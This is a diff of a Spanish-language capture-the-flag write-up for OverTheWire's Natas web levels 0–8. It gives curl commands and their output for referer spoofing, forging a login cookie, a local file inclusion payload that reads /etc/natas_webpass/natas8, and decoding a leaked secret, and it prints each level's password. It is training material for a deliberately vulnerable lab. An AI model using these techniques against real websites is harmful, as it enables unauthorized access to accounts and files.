@@ -2,8 +2,9 @@
 Natas son retos de pentesting web de "Over-The-Wire". Yo voy a realizar los ejercicios usando scripting en python y bash
 Para resolver la pagina hay que encontrar la contraseña para autenticarse en el nivel siguiente con el usuario llamado igual que en nivel actual.
 
-## (Natas0)[http://natas0.natas.labs.overthewire.org]
+## Natas0
 
+(Natas0)[http://natas0.natas.labs.overthewire.org]
 *Vulnerabilidad: credenciales en el codigo fuente*
 
 El nivel inicial, esconde la credencial en el código fuente. (clic derecho)
@@ -19,8 +20,8 @@ Desde consola tambien es pan comido
 [cucuxii@parrot]~[natas0]:$ curl -s "http://natas0.natas.labs.overthewire.org" -u natas0:natas0
 ... <!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
 ```
-## (Natas1)[http://natas1.natas.labs.overthewire.org]
-
+## Natas1
+(Natas1)[http://natas1.natas.labs.overthewire.org]
 *Vulnerabilidad: credenciales en el codigo fuente*
 *Restriccion: click derecho en el navegador*
 
@@ -31,8 +32,9 @@ Aunque se desactive dicho click en el navegador, con curl o python se puede acce
 ... <!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
 ```
 
-## (Natas2)[http://natas2.natas.labs.overthewire.org]
+## Natas2
 
+(Natas2)[http://natas2.natas.labs.overthewire.org]
 *Vulnerabilidad: directory liting*
 
 En la web aparentemente no hay nada y en el codigo fuente de natas2 no sale la contraseña, pero si sale un "img src" o sea una ruta de donde saca una foto.
@@ -43,8 +45,9 @@ En la web aparentemente no hay nada y en el codigo fuente de natas2 no sale la c
 Si ponemos en el nevegador la ruta ```"http://natas2.natas.labs.overthewire.org/files"``` tenemos un directory listing, es decir una lista de todos los 
 elementos que estan bajo dicha ruta, (entre ellas la foto de pixel.png) pero tambien un archivo de texto "users.txt" con la contraseña.
 
-## (Natas3)[http://natas3.natas.labs.overthewire.org]
+## Natas3
 
+(Natas3)[http://natas3.natas.labs.overthewire.org]
 *Vulnerabilidad: rutas criticas en el robots.txt*
 
 Otro "no hay nada en esta web" en el navegador
@@ -61,8 +64,9 @@ Disallow: /s3cr3t/
 ```
 Dicho "/s3cr3t" nos lleva a otro users.txt con las credenciales
 
-## (Natas4)[http://natas4.natas.labs.overthewire.org]
+## Natas4
 
+(Natas4)[http://natas4.natas.labs.overthewire.org]
 *Restriccion: referrer limitado*
 
 Este nivel nos dice que solo acepta a gente que venga desde ```http://natas5.natas.labs.overthewire.org/```, es decir que desde esa página hayan pinchado en un link para venir a la actual. Esto se llama referrer. Con curl se puede esècificar dicho referrer con "-e"
@@ -71,11 +75,92 @@ Este nivel nos dice que solo acepta a gente que venga desde ```http://natas5.nat
 > -e http://natas5.natas.labs.overthewire.org/
 Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
 ```
-## (Natas5)[http://natas5.natas.labs.overthewire.org]
+## Natas5
 
+(Natas5)[http://natas5.natas.labs.overthewire.org]
+*Vulnerabilidad: cookie forge o creacion de cookie*
 
+Aqui te dice que simplemente no estas logueado, cuando se habla de loguins hay que pensar en cookies, ya que estas son las que arrastran dicho loguin.
+```console
+[cucuxii@parrot]~[natas0]:$ curl -s "http://natas5.natas.labs.overthewire.org" -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq -I
+Set-Cookie: loggedin=0
+```
+Hay una cookie llamada logguedin que se iguala a 0 por defecto, haciendo que salga el mensaje de que no estas logueado. La cookie se puede colocar 
+con curl
 
+```console
+[cucuxii@parrot]~[natas0]:$ curl -s "http://natas5.natas.labs.overthewire.org" -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq  --cookie "loggedin=1"
+Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
+```
+## Natas6
 
+(Natas6)[http://natas6.natas.labs.overthewire.org]
+*Vulnerabilidad: rutas en el codigo fuente*
 
+Cuando visitamos la pagina hay un formulario para meter un "secreto" y con el ver la contraseña. Tambien hay un enlace a "index-source.html"
+Aqui hay un pequeño php que nos dice que hay que meter un valor "secret" por POST, tambien una ruta "include 'includes/secret.inc';"
+Si la isitamos damos con tal secreto
+```console
+[cucuxii@parrot]~[natas0]:$ curl -s "http://natas6.natas.labs.overthewire.org/includes/secret.inc" -u natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+$secret = "FOEIUWGHFEEUHOFUOIU";
+[cucuxii@parrot]~[natas0]:$ curl -s "http://natas6.natas.labs.overthewire.org" -u natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 -X POST \
+> -d "secret=FOEIUWGHFEEUHOFUOIU&submit="
+Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+```
+
+## Natas7
+
+(Natas7)[http://natas7.natas.labs.overthewire.org]
+*Vulnerabilidad: LFI (local file inclusion)*
+
+Cuando visitamos la web, en el codigo fuente se filtra otra ruta, pero no se puede acceder poniendola en la URL sin más. Aun asi en la web hay dos
+enlaces. Si clicamos en uno sale en la url un "index.php=home o index.php=about", que tambien se ve claramanete desde el codigo fuente.
+
+```console
+[cucuxii@parrot]~[natas0]:$ curl -s "http://natas7.natas.labs.overthewire.org" -u natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+<a href="index.php?page=home">Home</a>
+<a href="index.php?page=about">About</a>
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+[cucuxii@parrot]~[natas0]:$ curl -s "http://natas7.natas.labs.overthewire.org/etc/natas_webpass/natas8" -u natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+```
+Dicho index.php parece script que te redirige al sitio que pone tras el parametro "page". En este caso "home" y "about" pero la vulnerabilidad
+reside en que podemos poner nosotros el parametro que nos de la gana y nos lleve alli. Nos interesa la ruta que se nos ha filtrado antes.
+
+```console
+[cucuxii@parrot]~[natas0]:$ curl -s "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8" \ 
+-u natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+```
+
+## Natas8
+
+(Natas8)[http://natas8.natas.labs.overthewire.org]
+*Vulnerabilidad: algoritmo de encriptado filrado*
+
+Natas 8 nos pide otra vez un secreto y nos da la ruta del "index-source.html". 
+
+```console
+[cucuxii@parrot]~[natas0]:$ curl -s "http://natas8.natas.labs.overthewire.org/index-source.html" -u natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe | html2text
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+function encodeSecret($secret) { return bin2hex(strrev(base64_encode($secret))); }
+```
+O sea un hash y como se ha fabricado, un codigo al que le tendremos que dar la vuelta.
+
+```console
+[cucuxii@parrot]~[natas0]:$ php --interactive
+php > print(hex2bin("3d3d516343746d4d6d6c315669563362"));   # Si ha hecho un bin2hex supongo que existira un hex2bin
+==QcCtmMml1ViV3b
+php > print(strrev("==QcCtmMml1ViV3b"));   # Esta funcion simplemente le da la vuelta a la string
+b3ViV1lmMmtCcQ==
+php > print(base64_decode("b3ViV1lmMmtCcQ=="));
+oubWYf2kBq   # Se supone que este es el secreto
+```
+
+```console
+[cucuxii@parrot]~[natas0]:$ curl -s "http://natas8.natas.labs.overthewire.org" -u natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe \
+> -X POST -d "secret=oubWYf2kBq&submit="
+Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+```
+Mira pues si era, que bien :3
 
 
